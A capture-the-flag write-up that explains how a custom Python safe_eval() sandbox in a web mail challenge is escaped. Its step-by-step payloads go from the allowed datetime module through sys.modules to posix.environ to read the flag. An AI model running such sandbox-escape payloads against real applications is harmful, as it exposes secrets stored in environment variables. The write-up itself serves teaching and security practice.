**Challenge:** Vibe_web_mail  
**Category:** Web — Server-Side Template Injection (SSTI) / Python Sandbox Escape  
**Src:** [Vibe Web Mail](../Vibe_web_mail/)

## Overview

This challenge presents a custom `safe_eval()` function attempting to sandbox user expressions. The vulnerability lies in insufficient sandboxing that allows traversal from permitted builtin modules to system-level objects, ultimately leading to environment variable disclosure.

## Vulnerability Analysis

The application implements a custom `safe_eval()` function with the following security measures:

1. **Opcode Whitelisting**: Compiles expressions and validates opcodes against `_SAFE_OPCODES`
2. **Attribute Filtering**: Blocks names containing `__` and dangerous attributes
3. **Restricted Builtins**: Sets `globals()['__builtins__'] = dict(_BUILTINS)` with limited modules including `datetime`

However, the sandbox fails because:

- Permitted builtin modules retain references to the Python interpreter internals
- Object traversal through `sys.modules` is possible
- No restriction on accessing loaded modules via registry

## POSIX Module Background

The `posix` module is Python's low-level interface to POSIX operating system calls on Unix-like systems (Linux, macOS, etc.). It provides direct access to:

- **Environment variables** (`environ`)
- **File system operations** (`open`, `read`, `write`)
- **Process management** (`fork`, `exec`, `getpid`)
- **System information** (`uname`, `getuid`)

In Python sandbox escapes, `posix` is particularly valuable because it bridges the gap between Python code and the underlying operating system, often containing sensitive information like environment variables where flags are commonly stored.

## Exploitation

### Step 1: Reconnaissance

First, confirm expression evaluation works:

**Payload:** `7*7`  
**Result:** `49`

<img src="images/image_1.png" alt="Step 1 - Basic evaluation test" width="600">

### Step 2: Builtin Module Access

Test access to permitted `datetime` module:

**Payload:** `str(datetime)`  
**Result:** `<module 'datetime' from '/usr/lib/python3.x/datetime.py'>`

<img src="images/image_2.png" alt="Step 2 - DateTime module access" width="600">

**Payload:** `str(datetime.datetime.now())`  
**Result:** Current timestamp confirms method execution

### Step 3: System Module Discovery

Traverse from `datetime` to `sys.modules` to enumerate loaded modules:

**Payload:** `list(datetime.sys.modules.keys())`  
**Result:** List of all loaded Python modules

<img src="images/image_3.png" alt="Step 3 - Enumerate loaded modules" width="600">

### Step 4: POSIX Module Access

Verify access to `posix` module (Unix system interface):

**Payload:** `str(datetime.sys.modules.get("posix"))`  
**Result:** `<module 'posix' (built-in)>`

<img src="images/image_4.png" alt="Step 4 - POSIX module verification" width="600">

### Step 5: Environment Variable Access

Access OS environment variables through `posix.environ`:

**Payload:** `str(datetime.sys.modules.get("posix").environ)`  
**Result:** Dictionary of environment variables

<img src="images/image_5.png" alt="Step 5 - Environment variables access" width="600">

## Flag

`ASIS{PH1ND_50m3_V183_1n_3NV_de1d8572fde00fb04f06d1ce}`

---

_Author: Gia Than_
